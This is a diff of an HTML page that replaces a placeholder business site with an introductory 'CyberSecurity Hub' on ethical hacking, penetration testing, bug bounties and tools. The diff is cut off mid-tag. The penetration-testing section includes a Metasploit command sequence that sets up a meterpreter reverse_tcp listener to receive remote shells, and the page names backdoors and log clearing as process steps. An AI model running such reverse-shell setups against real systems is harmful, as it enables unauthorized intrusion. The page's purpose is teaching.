-            <p>We help you stay secure in the age of digital threats by providing cutting-edge ethical hacking tools, OSINT techniques, and cyber defense strategies — tailored for real-world impact. .@sarveshbharti2025.</p>
-            <a href="#contact" class="cta-button">Get Started</a>
-            <a href="#features" class="secondary-button">Learn More</a>
+    <!-- Sidebar -->
+    <div id="sidebar" class="sidebar fixed top-0 left-0 w-64 h-full bg-black text-green-400 p-4 border-r border-green-400 z-40 overflow-y-auto">
+        <div class="text-center mb-8">
+            <h2 class="text-2xl font-bold glow-text">CyberSecurity Hub</h2>
+            <p class="text-sm">by SARVESH NHARTI</p>
         </div>
-    </section>
-
-    <!-- Features Section -->
-    <section class="features" id="features">
-        <div class="container">
-            <div class="section-title">
-                <h2>Our Core Features</h2>
-                <p>Discover what makes our solutions stand out in the competitive digital landscape.</p>
-            </div>
-            <div class="features-grid">
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-rocket"></i>
-                    </div>
-                    <h3>Fast Performance</h3>
-                    <p>Optimized solutions that load instantly and perform flawlessly across all devices and platforms.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-lock"></i>
-                    </div>
-                    <h3>Ultra Secure</h3>
-                    <p>Enterprise-grade security measures to protect your data and your customers' privacy.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-chart-line"></i>
-                    </div>
-                    <h3>Data Analytics</h3>
-                    <p>Powerful insights and actionable data to drive your business decisions and growth.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-mobile-alt"></i>
-                    </div>
-                    <h3>Responsive Design</h3>
-                    <p>Flawless experience on any device with our mobile-first responsive design approach.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-cogs"></i>
-                    </div>
-                    <h3>Custom Solutions</h3>
-                    <p>Tailored specifically for your business needs with scalable architecture.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-headset"></i>
-                    </div>
-                    <h3>24/7 Support</h3>
-                    <p>Dedicated support team available around the clock to assist you whenever needed.</p>
-                </div>
-            </div>
+        
+        <div class="space-y-2">
+            <button data-section="intro" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Introduction</button>
+            <button data-section="ethicalHacking" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Ethical Hacking</button>
+            <button data-section="penTesting" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Penetration Testing</button>
+            <button data-section="bugBounty" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Bug Bounty</button>
+            <button data-section="tools" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Essential Tools</button>
+            <button data-section="methodologies" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Methodologies</button>
+            <button data-section="certifications" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Certifications</button>
+            <button data-section="resources" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Learning Resources</button>
+            <button data-section="legal" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Legal Aspects</button>
+            <button data-section="community" class="w-full py-2 px-4 bg-transparent border border-green-400 rounded-md text-left btn-hover">Community</button>
         </div>
-    </section>
-
-    <!-- Team Section -->
-    <section class="team" id="team">
-        <div class="container">
-            <div class="section-title">
-                <h2>Meet Our Team</h2>
-                <p>Experts passionate about delivering exceptional digital experiences.</p>
-            </div>
-            <div class="team-grid">
-                <div class="team-card">
-                    <div class="team-image">
-                        <img src="https://placehold.co/600x400" alt="Professional headshot of Sarah Johnson, our CEO, a smiling woman with brown hair in a blue blazer">
-                    </div>
-                    <div class="team-info">
-                        <h3>Sarah Johnson</h3>
-                        <p>CEO & Founder</p>
-                        <div class="social-links">
-                            <a href="#"><i class="fab fa-linkedin"></i></a>
-                            <a href="#"><i class="fab fa-twitter"></i></a>
-                        </div>
-                    </div>
-                </div>
-                <div class="team-card">
-                    <div class="team-image">
-                        <img src="https://placehold.co/600x400" alt="Headshot of Michael Chen, our CTO, wearing glasses and a gray shirt with a modern office background">
-                    </div>
-                    <div class="team-info">
-                        <h3>Michael Chen</h3>
-                        <p>Chief Technology Officer</p>
-                        <div class="social-links">
-                            <a href="#"><i class="fab fa-github"></i></a>
-                            <a href="#"><i class="fab fa-twitter"></i></a>
-                        </div>
-                    </div>
-                </div>
-                <div class="team-card">
-                    <div class="team-image">
-                        <img src="https://placehold.co/600x400" alt="Portrait of David Williams, our Lead Designer, showing sketchbook ideas with a creative workspace in background">
-                    </div>
-                    <div class="team-info">
-                        <h3>David Williams</h3>
-                        <p>Lead Designer</p>
-                        <div class="social-links">
-                            <a href="#"><i class="fab fa-dribbble"></i></a>
-                            <a href="#"><i class="fab fa-behance"></i></a>
-                        </div>
-                    </div>
-                </div>
-                <div class="team-card">
-                    <div class="team-image">
-                        <img src="https://placehold.co/600x400" alt="Professional shot of Emily Rodriguez, our Marketing Director, presenting analytics with a city skyline view">
-                    </div>
-                    <div class="team-info">
-                        <h3>Emily Rodriguez</h3>
-                        <p>Marketing Director</p>
-                        <div class="social-links">
-                            <a href="#"><i class="fab fa-instagram"></i></a>
-                            <a href="#"><i class="fab fa-linkedin"></i></a>
-                        </div>
-                    </div>
-                </div>
-            </div>
+        
+        <div class="mt-8 text-center text-xs">
+            <p>simran404cyberx</p>
         </div>
-    </section>
-
-    <!-- Testimonials Section -->
-    <section class="testimonials" id="testimonials">
-        <div class="container">
-            <div class="section-title">
-                <h2>What Our Clients Say</h2>
-                <p>Hear from businesses that have transformed their operations with our solutions.</p>
-            </div>
-            <div class="testimonials-container">
-                <div class="testimonial">
-                    <div class="testimonial-content">
-                        <p>Working with Nexus has been transformative for our business. Their platform increased our operational efficiency by 40% and provided insights we never had before.</p>
-                    </div>
-                    <div class="testimonial-author">
-                        <div class="author-image">
-                            <img src="https://placehold.co/100x100" alt="Portrait of John Peterson, CEO of TechForward Inc, wearing a navy suit and smiling">
-                        </div>
-                        <div class="author-info">
-                            <h4>John Peterson</h4>
-                            <p>CEO, TechForward Inc.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="testimonial">
-                    <div class="testimonial-content">
-                        <p>The level of customization and attention to detail exceeded our expectations. Our digital presence has never been stronger, and customer engagement is at an all-time high.</p>
-                    </div>
-                    <div class="testimonial-author">
-                        <div class="author-image">
-                            <img src="https://placehold.co/100x100" alt="Headshot of Lisa Thompson, Marketing Director at BrightSolutions, wearing glasses and a red blouse">
-                        </div>
-                        <div class="author-info">
-                            <h4>Lisa Thompson</h4>
-                            <p>Marketing Director, BrightSolutions</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Contact Section -->
-    <section class="contact" id="contact">
-        <div class="container">
-            <div class="section-title">
-                <h2>Get In Touch</h2>
-                <p>Ready to transform your business? Contact us today to discuss your project.</p>
-            </div>
-            <div class="contact-container">
-                <div class="contact-info">
-                    <h3>Contact Information</h3>
-                    <p>We're here to answer any questions you may have about our services. Reach out to us and we'll respond as soon as we can.</p>
-                    <div class="contact-details">
-                        <div class="contact-item">
-                            <i class="fas fa-map-marker-alt"></i>
-                            <span>123 Tech Avenue, Silicon Valley, CA 94000</span>
-                        </div>
-                        <div class="contact-item">
-                            <i class="fas fa-phone-alt"></i>
-                            <span>+1 (555) 123-4567</span>
-                        </div>
-                        <div class="contact-item">
-                            <i class="fas fa-envelope"></i>
-                            <span>sarveshjatav738@gmail.com</span>
-                        </div>
-                    </div>
-                    <div class="contact-social">
-                        <a href="#"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
-                        <a href="#"><i class="fab fa-instagram"></i></a>
-                    </div>
-                </div>
-                <form class="contact-form" id="contactForm">
-                    <input type="text" placeholder="Your Name" required>
-                    <input type="email" placeholder="Your Email" required>
-                    <input type="text" placeholder="Subject">
-                    <textarea placeholder="Your Message" required></textarea>
-                    <button type="submit" class="cta-button">Send Message</button>
-                </form>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer>
-        <div class="container">
-            <div class="footer-container">
-                <div class="footer-col">
-                    <h3>Nexux</h3>
-                    <p>We deliver innovative digital solutions that drive business growth through technology, design, and strategic thinking.</p>
-                </div>
-                <div class="footer-col">
-                    <h3>Quick Links</h3>
-                    <ul class="footer-links">
-                        <li><a href="#">Home</a></li>
-                        <li><a href="#features">Services</a></li>
-                        <li><a href="#team">Team</a></li>
-                        <li><a href="#testimonials">Testimonials</a></li>
-                        <li><a href="#contact">Contact</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h3>Services</h3>
-                    <ul class="footer-links">
-                        <li><a href="#">Web Development</a></li>
-                        <li><a href="#">Mobile Apps</a></li>
-                        <li><a href="#">UI/UX Design</a></li>
-                        <li><a href="#">Digital Marketing</a></li>
-                        <li><a href="#">Cloud Solutions</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h3>Subscribe</h3>
-                    <p>Subscribe to our newsletter for the latest updates and insights.</p>
-                    <form class="subscribe-form">
-                        <input type="email" placeholder="Your Email">
-                        <button type="submit"><i class="fas fa-paper-plane"></i></button>
-                    </form>
-                </div>
-            </div>
-            <div class="copyright">
-                <p>&copy; 2023 Nexus. All rights reserved.</p>
-            </div>
-        </div>
-    </footer>
-
-    <!-- Scroll to Top Button -->
-    <div class="scroll-top">
-        <i class="fas fa-arrow-up"></i>
     </div>
-
-    <!-- JavaScript -->
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Mobile menu toggle
-            const menuToggle = document.querySelector('.menu-toggle');
-            const navLinks = document.querySelector('.nav-links');
+    
+    <!-- Main Content -->
+    <main class="min-h-screen flex flex-col items-center justify-center p-4 pt-20">
+        <div class="w-full max-w-4xl mx-auto">
+            <!-- Introduction Section -->
+            <section id="intro" class="content-section active">
+                <div class="text-center mb-8">
+                    <h1 class="text-4xl font-bold mb-2 glow-text">CyberSecurity Hub</h1>
+                    <p class="text-xl mb-4">Your comprehensive guide to Ethical Hacking, Penetration Testing & Bug Bounty</p>
+                    <p class="text-sm">Developed by SARVESH NHARTI</p>
+                    <p class="text-xs mt-2">simran404cyberx</p>
+                </div>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
+                    <div class="p-4 border border-green-400 rounded-md">
+                        <h3 class="text-xl font-bold mb-2">What is Ethical Hacking?</h3>
+                        <p>Ethical hacking involves an authorized attempt to gain unauthorized access to a computer system, application, or data.</p>
+                    </div>
+                    <div class="p-4 border border-green-400 rounded-md">
+                        <h3 class="text-xl font-bold mb-2">Penetration Testing</h3>
+                        <p>A simulated cyber attack against your computer system to check for exploitable vulnerabilities.</p>
+                    </div>
+                </div>
+                
+                <div class="text-center">
+                    <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/5f065b03-febc-4fdd-9e26-2b49bcc1e49b.png" alt="Digital security concept with glowing padlock and binary code background" class="mx-auto rounded-md mb-4" />
+                    <p class="text-sm">Explore the different sections using the menu to learn more about cybersecurity.</p>
+                </div>
+            </section>
             
-            menuToggle.addEventListener('click', () => {
-                navLinks.classList.toggle('active');
-                menuToggle.querySelector('i').classList.toggle('fa-times');
-            });
-
-            // Smooth scrolling for navigation links
-            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-                anchor.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    const target = document.querySelector(this.getAttribute('href'));
-                    if (target) {
-                        window.scrollTo({
-                            top: target.offsetTop - 80,
-                            behavior: 'smooth'
-                        });
-                        
-                        // Close mobile menu after clicking a link
-                        if (navLinks.classList.contains('active')) {
-                            navLinks.classList.remove('active');
-                            menuToggle.querySelector('i').classList.remove('fa-times');
-                        }
-                    }
-                });
-            });
-
-            // Scroll to top button
-            const scrollTopBtn = document.querySelector('.scroll-top');
-            window.addEventListener('scroll', () => {
-                if (window.pageYOffset > 300) {
-                    scrollTopBtn.classList.add('active');
-                } else {
-                    scrollTopBtn.classList.remove('active');
-                }
-            });
+            <!-- Ethical Hacking Section -->
+            <section id="ethicalHacking" class="content-section">
+                <h2 class="text-3xl font-bold mb-6 text-center glow-text">Ethical Hacking</h2>
+                
+                <div class="mb-8">
+                    <h3 class="text-xl font-bold mb-2">Definition</h3>
+                    <p class="mb-4">Ethical hacking, also known as penetration testing or white-hat hacking, involves the same tools, tricks, and techniques that hackers use, but with one major difference: Ethical hacking is performed with the target's permission.</p>
+                    
+                    <h3 class="text-xl font-bold mb-2">Types of Hackers</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">White Hat</h4>
+                            <p>Ethical hackers who work to improve security by finding vulnerabilities.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Black Hat</h4>
+                            <p>Malicious hackers who exploit vulnerabilities for personal gain.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Grey Hat</h4>
+                            <p>Hackers who may violate laws but don't have malicious intent.</p>
+                        </div>
+                    </div>
+                    
+                    <h3 class="text-xl font-bold mb-2">Ethical Hacking Process</h3>
+                    <ol class="list-decimal pl-6 mb-4 space-y-2">
+                        <li>Reconnaissance (Information Gathering)</li>
+                        <li>Scanning (Identifying Open Ports and Services)</li>
+                        <li>Gaining Access (Exploiting Vulnerabilities)</li>
+                        <li>Maintaining Access (Creating Backdoors)</li>
+                        <li>Covering Tracks (Clearing Logs)</li>
+                    </ol>
+                    
+                    <div class="code-block p-4 rounded-md mb-4">
+                        <h4 class="font-bold mb-2">Example Reconnaissance Command:</h4>
+                        <pre class="font-mono text-sm">nmap -sV -O target.com</pre>
+                    </div>
+                </div>
+            </section>
             
-            scrollTopBtn.addEventListener('click', () => {
-                window.scrollTo({
-                    top: 0,
-                    behavior: 'smooth'
-                });
-            });
-
-            // Form submission
-            const contactForm = document.getElementById('contactForm');
-            contactForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                alert('Thank you for your message! We will get back to you soon.');
-                this.reset();
-            });
-        });
-    </script>
-</body>
-</html>
+            <!-- Penetration Testing Section -->
+            <section id="penTesting" class="content-section">
+                <h2 class="text-3xl font-bold mb-6 text-center glow-text">Penetration Testing</h2>
+                
+                <div class="mb-8">
+                    <h3 class="text-xl font-bold mb-2">What is Penetration Testing?</h3>
+                    <p class="mb-4">Penetration testing is a simulated cyber attack against your computer system to check for exploitable vulnerabilities. In the context of web application security, penetration testing is commonly used to augment a web application firewall (WAF).</p>
+                    
+                    <h3 class="text-xl font-bold mb-2">Types of Penetration Tests</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Black Box Testing</h4>
+                            <p>Tester has no prior knowledge of the system being tested.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">White Box Testing</h4>
+                            <p>Tester has complete knowledge of the system being tested.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Gray Box Testing</h4>
+                            <p>Tester has partial knowledge of the system being tested.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Red Team Exercises</h4>
+                            <p>Simulated real-world attacks with multiple vectors.</p>
+                        </div>
+                    </div>
+                    
+                    <h3 class="text-xl font-bold mb-2">Penetration Testing Methodology</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div>
+                            <h4 class="font-bold mb-2">OWASP Testing Guide</h4>
+                            <p>The Open Web Application Security Project (OWASP) provides a comprehensive testing guide for web applications.</p>
+                        </div>
+                        <div>
+                            <h4 class="font-bold mb-2">PTES Standard</h4>
+                            <p>The Penetration Testing Execution Standard provides a common language and scope for performing penetration tests.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="code-block p-4 rounded-md mb-4">
+                        <h4 class="font-bold mb-2">Example Metasploit Command:</h4>
+                        <pre class="font-mono text-sm">msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST your_ip
+set LPORT 4444
+exploit</pre>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Bug Bounty Section -->
+            <section id="bugBounty" class="content-section">
+                <h2 class="text-3xl font-bold mb-6 text-center glow-text">Bug Bounty Programs</h2>
+                
+                <div class="mb-8">
+                    <h3 class="text-xl font-bold mb-2">What is a Bug Bounty?</h3>
+                    <p class="mb-4">A bug bounty program is a deal offered by many websites, organizations, and software developers by which individuals can receive recognition and compensation for reporting bugs, especially those pertaining to security exploits and vulnerabilities.</p>
+                    
+                    <h3 class="text-xl font-bold mb-2">Popular Bug Bounty Platforms</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">HackerOne</h4>
+                            <p>One of the largest bug bounty platforms with programs from companies like Google, GitHub, and more.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Bugcrowd</h4>
+                            <p>Another major platform hosting bug bounty programs for various organizations.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Synack</h4>
+                            <p>An invite-only bug bounty platform with vetted researchers.</p>
+                        </div>
+                    </div>
+                    
+                    <h3 class="text-xl font-bold mb-2">Getting Started with Bug Bounty</h3>
+                    <ol class="list-decimal pl-6 mb-4 space-y-2">
+                        <li>Learn the basics of web application security</li>
+                        <li>Understand common vulnerabilities (OWASP Top 10)</li>
+                        <li>Practice on intentionally vulnerable applications</li>
+                        <li>Start with small scope programs</li>
+                        <li>Write clear and detailed reports</li>
+                    </ol>
+                    
+                    <div class="code-block p-4 rounded-md mb-4">
+                        <h4 class="font-bold mb-2">Example Vulnerability Report Structure:</h4>
+                        <pre class="font-mono text-sm">1. Title: Brief description
+2. Description: Detailed explanation
+3. Steps to Reproduce: Clear reproduction steps
+4. Impact: Potential consequences
+5. Suggested Fix: Recommended solution
+6. References: Any supporting materials</pre>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Tools Section -->
+            <section id="tools" class="content-section">
+                <h2 class="text-3xl font-bold mb-6 text-center glow-text">Essential Tools</h2>
+                
+                <div class="mb-8">
+                    <h3 class="text-xl font-bold mb-2">Reconnaissance Tools</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Nmap</h4>
+                            <p>Network mapper for discovering hosts and services on a network.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Recon-ng</h4>
+                            <p>Web reconnaissance framework with multiple modules.</p>
+                        </div>
+                    </div>
+                    
+                    <h3 class="text-xl font-bold mb-2">Vulnerability Scanners</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Nessus</h4>
+                            <p>Comprehensive vulnerability scanner with extensive plugin library.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">OpenVAS</h4>
+                            <p>Open-source vulnerability scanner and manager.</p>
+                        </div>
+                    </div>
+                    
+                    <h3 class="text-xl font-bold mb-2">Exploitation Tools</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Metasploit Framework</h4>
+                            <p>Penetration testing platform with exploit development tools.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Burp Suite</h4>
+                            <p>Web application security testing platform.</p>
+                        </div>
+                    </div>
+                    
+                    <h3 class="text-xl font-bold mb-2">Post-Exploitation Tools</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Mimikatz</h4>
+                            <p>Credential extraction tool for Windows environments.</p>
+                        </div>
+                        <div class="p-4 border border-green-400 rounded-md">
+                            <h4 class="font-bold">Cobalt Strike</h4>
+                            <p>Post-exploitation framework for red team operations.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Methodologies Section -->
+            <section id="methodologies" class="content-section">
+                <h2 class="text-3xl font-bold mb-6 text-center glow-text">Methodologies</h2>
+                
+                <div class="mb-8">
+                    <h3 class="text-xl font-bold mb-2">OWASP Testing Guide</h3>
+                    <p class="mb-4">The OWASP Testing Guide provides a comprehensive framework for testing the security of web applications and services.</p>
+                    
+                    <h3 class="text-xl font-bold mb-2">PTES (Penetration Testing Execution Standard)</h3>
+                    <p class="mb-4">The PTES defines seven stages of penetration testing: Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post Exploitation, and Reporting.</p>
+                    
+                    <h3 class="text-xl font-bold mb-2">NIST Cybersecurity Framework</h3>
+                    <p class="mb-4">The NIST Cybersecurity Framework provides a policy framework of computer security guidance for how private sector organizations can assess and improve their ability to prevent, detect, and respond to cyber attacks.</p>
+                    
+                    <h3 class="text-xl font-bold mb-2">MITRE ATT&CK Framework</h3>
+                    <p class="mb-4">MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.</p>
+                </div>
+            </section>
+            
+            <!-- Certifications Section -->
+            <section id="certifications" class="content-section">
+                <h2 class="text-3xl font-bold mb-6 text-center glow-text">Certifications</h2>
+                
+                <div class="mb-8">
+                    <h3 class="text-xl font-bold mb-2">Entry-Level Certifications</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div clas
